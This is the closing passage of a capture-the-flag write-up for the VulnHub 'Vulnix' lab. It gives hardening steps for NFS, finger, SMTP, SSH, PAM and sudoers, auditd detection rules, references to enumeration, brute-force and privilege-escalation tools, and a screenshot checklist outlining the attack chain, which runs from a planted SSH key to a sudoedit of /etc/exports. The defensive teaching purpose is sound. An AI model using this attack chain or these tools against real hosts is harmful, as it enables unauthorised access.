   /srv/nfs4/homes   gss/krb5p(rw,sync,fsid=0,crossmnt,no_subtree_check)
   ```
   The `/etc/exports` on this box literally has that as a commented example. Use it.
4. **Firewall `rpcbind`, `mountd`, `nlockmgr` and `status`.** They must never be
   reachable from untrusted networks. Restrict by source IP *and* keep them off the
   internet. Also fix the random ports so the firewall is writable:
   ```text
   # /etc/default/nfs-kernel-server
   RPCMOUNTDOPTS="--port 20048"
   # /etc/default/nfs-common
   STATDOPTS="--port 662 --outgoing-port 663"
   ```
5. **Disable `finger`.** There is no modern reason to run it.
   `systemctl disable --now fingerd` (or remove the package entirely).
6. **Disable SMTP `VRFY`/`EXPN`.** In Postfix:
   ```text
   disable_vrfy_command = yes
   smtpd_discard_ehlo_keywords =
   smtpd_data_restrictions = reject_unauth_pipelining
   ```
   And make the server return an identical response for known and unknown recipients
   so enumeration yields nothing.
7. **Remove the `r`-services.** `rexecd`, `rlogind`, `rshd`, `telnetd`, `ftpd` —
   purge them. SSH with key-only auth is the replacement:
   ```text
   # /etc/ssh/sshd_config
   PasswordAuthentication no
   PermitRootLogin no
   AllowGroups ssh-users
   MaxAuthTries 3
   LoginGraceTime 20
   ```
8. **Enforce a real password policy.** `letmein` cracked in minutes with a 220-word
   list. Use `pam_pwquality` (`minlen=14`, `dictcheck=1`, `enforce_for_root`) plus
   `pam_faillock` (3 failures → 15 min lockout), and screen against a breached-list
   API.
9. **Audit `sudoers` for configuration files.** This is the finding that mattered
   most. `sudoedit` (or `visudo`) on any of these is effectively a root grant:
   `/etc/exports`, `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`,
   `/etc/ssh/sshd_config`, `/etc/crontab`, `/etc/fstab`, any file under
   `/etc/systemd/`, any web server config, any `.service` unit.
   ```bash
   sudo grep -RInE 'sudoedit|visudo' /etc/sudoers /etc/sudoers.d/
   ```
10. **Monitor for UID impersonation and SUID plants.**
    - auditd on the exports file: `-w /etc/exports -p wa -k nfs_exports`
    - auditd on authorized_keys: `-w /home/vulnix/.ssh -p wa -k ssh_keys`
    - A daily SUID/SGID inventory diffed against a baseline
      (`aide`, `osquery`'s `suid_bin` table, or Wazuh's FIM).
    - Alert on any NFS mount request from an unexpected client IP.
11. **Log and review `mountd` requests.** `/var/log/syslog` records
    `authenticated mount request from <ip>` — a mount from an unrecognised host is a
    high-value alert.

---

## 9. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/hacklab-vulnix,48/>
- Original author writeup: <http://www.rebootuser.com/?p=933>
- Community writeups consulted:
  - [abatchy — Vulnix Walkthrough (Vulnhub)](https://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm.html)
  - [seekorswim — HackLAB: Vulnix](https://seekorswim.github.io/walkthroughs/2019-04-15/hacklab-vulnix/)
  - [haxez — Vulnix](https://haxez.org/vulnix/)
  - [liberty-shell — Vulnix](https://liberty-shell.com/sec/2017-10-04/vulnix/)
  - [dasagreeva — HackLAB: Vulnix Walkthrough](https://medium.com/@dasagreeva/hacklab-vulnix-walkthrough-ff8c6414766d)
  - [ohexfortyone — Vulnhub: HackLAB: Vulnix Boot2Root VM](https://ohexfortyone.com/2018/03/vulnhub-hacklab-vulnix-boot2root-vm.html)
  - [hackengers — HackLAB: Vulnix Walkthrough](https://www.hackengers.com/2020/06/hacklab-vulnix-walthrough-vulnhub-you.html)
  - [ivandano77 — Vulnix Writeup (Vulnhub Intermediate Machine)](https://medium.com/@ivandano77/vulnix-writeup-vulnhub-intermediate-machine-2a7ddb0cb4c5)
  - [InfoSec Institute — Vulnhub machines walkthrough series: Vulnix](https://www.infosecinstitute.com/resources/penetration-testing/vulnhub-machines-walkthrough-series-vulnix/)
  - [tcert.net — Vulnix walkthrough which bolstered my RHCSA knowledge](https://tcert.net/vulnix-walkthrough-which-bolstered-my-rhcsa-knowledge/)
  - [Hwakili/Hacklab-Vulnix (GitHub)](https://github.com/Hwakili/Hacklab-Vulnix)
- Tools / background:
  - [`exports(5)` man page — the NFS export options](https://man7.org/linux/man-pages/man5/exports.5.html)
  - [`nfs(5)` man page — NFS fundamentals and security flavours](https://man7.org/linux/man-pages/man5/nfs.5.html)
  - [nfspy — a Python library for automounting and falsifying NFS credentials](https://github.com/bonsaiviking/nfspy)
  - [pentestmonkey finger-user-enum](https://github.com/pentestmonkey/finger-user-enum) · [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
  - [hydra](https://github.com/vanhauser-thc/thc-hydra) · [fasttrack wordlist](https://github.com/trustedsec/fasttrack)
  - [`ssh-keygen(1)`](https://man.openbsd.org/ssh-keygen.1) · [`authorized_keys` and StrictModes](https://man.openbsd.org/sshd#AUTHORIZED_KEYS_FILE_FORMAT)
  - [GTFOBins — SUID bash](https://gtfobins.github.io/gtfobins/bash/#suid)
  - [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
  - [CVE-2016-5195 — Dirty COW](https://dirtycow.ninja)

---

## 10. Screenshot checklist

- [ ] `images/01-finger.png` — `finger` / `smtp-user-enum` output listing `user` and `vulnix`
- [ ] `images/02-showmount.png` — `showmount -e` revealing `/home/vulnix *`
- [ ] `images/03-ssh-user.png` — SSH as `user`, `id vulnix` → UID 2008
- [ ] `images/04-vulnix.png` — SSH as `vulnix` via the planted key
- [ ] `images/05-exports.png` — `sudoedit /etc/exports` + `showmount` showing `/root`
- [ ] `images/06-trophy.png` — `trophy.txt`
- [ ] `images/07-services.png` — the full port list (r-services, mail, NFS)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
